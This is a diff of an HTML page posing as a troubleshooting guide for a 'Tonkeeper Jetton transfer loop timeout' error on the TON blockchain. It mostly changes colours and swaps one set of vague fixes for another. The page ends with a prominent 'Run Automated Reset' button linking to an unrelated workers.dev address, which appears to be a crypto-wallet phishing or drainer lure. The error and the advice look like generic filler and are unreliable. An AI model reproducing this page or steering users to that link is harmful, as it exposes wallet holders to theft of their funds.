@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: system-ui;
-        background: #0f111a;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,31 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons within the TON ecosystem, resulting in failed transactions and potential loss of funds.</li>
+<li>Users of the TON ecosystem may encounter an error message indicating a "Tonkeeper Jetton transfer loop timeout" when attempting to transfer jettons, which are a type of token within the ecosystem. This error typically manifests as a timeout or failure to complete the transfer process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timing mismatch between the Tonkeeper wallet and the TON blockchain, causing the transfer loop to exceed the maximum allowed timeout period.</li>
+<li>The Tonkeeper Jetton transfer loop timeout error occurs due to issues with the synchronization or communication between the user's wallet, the Tonkeeper platform, and the TON blockchain. This can be caused by network congestion, wallet configuration problems, or temporary outages on the TON network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the timeout threshold manually using the Tonkeeper API.</li>
-<li>Verify the wallet's clock synchronization with the TON blockchain to ensure accurate timing.</li>
-<li>Utilize the following JSON configuration to adjust the transfer loop settings:</li>
+<li>To resolve the issue, users can try the following steps:</li>
+<li>Check the TON blockchain status for any ongoing maintenance or issues that might be affecting the transfer process.</li>
+<li>Verify that the wallet is properly configured and connected to the correct network.</li>
+<li>Attempt to restart the transfer process after ensuring the wallet and network are functioning correctly.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;retry_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;transfer_loop_delay&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5000</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>config<span class="w"> </span>--json<span class="w"> </span>&gt;&gt;<span class="w"> </span>ton_config.json
 </code></pre></div>
 
-<p>Consider utilizing an external console for advanced troubleshooting and configuration adjustments. </p>
+<p>Consider utilizing an external console for advanced troubleshooting and configuration adjustments.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonkeeper wallet installed and configured correctly</li>
-<li>Basic understanding of TON blockchain and jetton transfer mechanics</li>
-<li>Access to the Tonkeeper API documentation and developer tools</li>
+<li>Basic understanding of the TON ecosystem and its components.</li>
+<li>Familiarity with the Tonkeeper platform and jetton management.</li>
+<li>Access to the <code>tonos-cli</code> command-line tool for advanced configuration and troubleshooting.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
